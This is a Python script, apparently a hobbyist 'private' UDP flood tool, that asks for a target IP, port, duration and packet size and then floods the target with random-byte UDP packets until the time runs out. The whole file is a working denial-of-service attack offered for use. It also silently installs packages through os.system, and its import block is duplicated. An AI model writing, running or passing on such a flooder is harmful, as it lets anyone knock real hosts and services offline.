import os, sys, codecs

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")

import os, sys, codecs

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")

from time import time as tt
import threading
import socket
import random

print("""\033[91m
—–-—▒▒▒▒▒▒▒▒▒▒
—–-▒███████████▒
—▒████▒▒▒▒▒▒▒███▒
-▒████▒▒▒▒▒▒▒▒▒███▒……………….▒▒▒▒▒▒
-▒███▒▒▒▒▒███▒▒▒███▒…………..▒██████▒
-▒███▒▒▒▒██████▒▒███▒……….▒██▒▒▒▒██▒     \033[93m█▀█ █▀█ █ █░█ ▄▀█ ▀█▀ █▀▀ \033[91m
—▒███▒▒▒███████▒▒██▒…….▒███▒▒█▒▒██▒     \033[93m█▀▀ █▀▄ █ ▀▄▀ █▀█ ░█░ ██▄ \033[91m
—▒███▒▒▒███████▒▒██▒…….▒███▒▒█▒▒██▒
—–▒███▒▒████████▒██▒…▒███▒▒███▒▒██▒
——–▒██▒▒██████████▒▒███▒▒████▒▒██▒
———▒██▒▒██████████████▒████▒▒██▒
———-▒██▒▒█████████████████▒▒██▒
————▒██▒▒██████████████▒▒██▒
————–▒██▒▒████████████▒▒██▒            
—————-▒██▒▒██████████▒▒██▒
—————–▒██▒▒████████▒▒██▒
——————-▒██▒▒██████▒▒██▒
———————▒██▒▒████▒▒██▒
———————-▒██▒▒███▒▒█▒
————————▒██▒▒█▒▒█▒
————————-▒██▒▒▒█▒
—————————▒██▒█▒
—————————♥♥♥♥♥♥
—————————-♥♥♥♥♥
——————————♥♥♥
—————————-—♥♥
———————————♥
\033[91m        Made by Pushy
""")
ip = str(input("\033[96m Your IP \033[93m  ====> : "))
port = int(input(" \033[96mProt \033[93m====> : "))
time = int(input(" \033[96mTime \033[93m      ====> : "))
size = int(input("\033[96m Thread \033[93m    ====> : "))

brand = """\033[32m

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀
⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀
⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀
⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀
⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁ 
\033[93m                Sending Attack...
            Made by Pushy
"""

os.system("cls")
def attack(ip, port, time, size):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[95m=+=+=+=+ PRIVATΣ LAUNCHED! +=+=+=+=")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    size = os.urandom(min(666, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))

    print('\033[92mAttack Finished')
    os.system("cls")

if __name__ == '__main__':
    try:
        attack(ip, port, time, size)
    except KeyboardInterrupt:
        print('Attack stopped.')
